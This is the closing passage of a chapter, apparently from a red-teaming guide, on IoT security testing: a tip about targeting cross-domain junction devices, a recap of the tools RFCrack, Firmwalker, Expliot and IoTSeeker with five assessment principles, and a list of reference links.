> For IoT red teaming, the most valuable attack chains typically cross multiple device types and protocols. Focus on finding bridges between systems—like the building automation controller that connects to both the IT network and the HVAC system, or the IP camera that uses both ethernet and wireless protocols. These junction points often have weaker security controls due to the challenges of securing cross-domain communications.

## Conclusion

IoT security assessment requires a diverse toolkit that spans radio frequency analysis, firmware inspection, protocol testing, and specialized device exploitation. The tools and techniques covered in this chapter—RFCrack, Firmwalker, Expliot, and IoTSeeker—provide a comprehensive approach to evaluating IoT security from both wireless and network perspectives.

When assessing IoT environments, remember these key principles:

1. **Multi-layered Approach**: Test at all layers (radio, network, application, hardware)
2. **Protocol Diversity**: Be prepared for both standard and proprietary protocols
3. **Physical-Digital Integration**: Consider both cyber and physical security aspects
4. **Supply Chain Awareness**: Evaluate vendor security practices and firmware update mechanisms
5. **Operational Impact**: Balance testing thoroughness with operational safety

As IoT adoption continues to accelerate across industries, these skills will become increasingly critical for red teams seeking to provide realistic security assessments. The unique challenges of IoT security—resource constraints, specialized protocols, and physical-digital crossovers—require specialized tools and techniques that differ significantly from traditional IT security testing.

In the next chapter, we'll explore specialized environments for practicing these techniques safely, providing a comprehensive framework for honing your red team skills without impacting production systems.

## Additional Resources

- [RFCrack Documentation](https://github.com/cclabsInc/RFCrack)
- [Firmwalker Usage Guide](https://github.com/craigz28/firmwalker)
- [Expliot Framework Documentation](https://expliot.readthedocs.io/)
- [IoTSeeker Repository](https://github.com/rapid7/IoTSeeker)
- [OWASP IoT Security Testing Guide](https://owasp.org/www-project-iot-security-testing-guide/)
- [Building an IoT Pentest Lab](https://medium.com/@rejah.rehim/building-an-iot-pentesting-lab-a0bacc35b51d)
- [IoT Penetration Testing Cookbook](https://www.packtpub.com/product/iot-penetration-testing-cookbook/9781787280571)
- [IoT Hackers Handbook](https://www.apress.com/gp/book/9781484242995)
- [OWASP IoT Top 10](https://owasp.org/www-pdf-archive/OWASP-IoT-Top-10-2018-final.pdf)
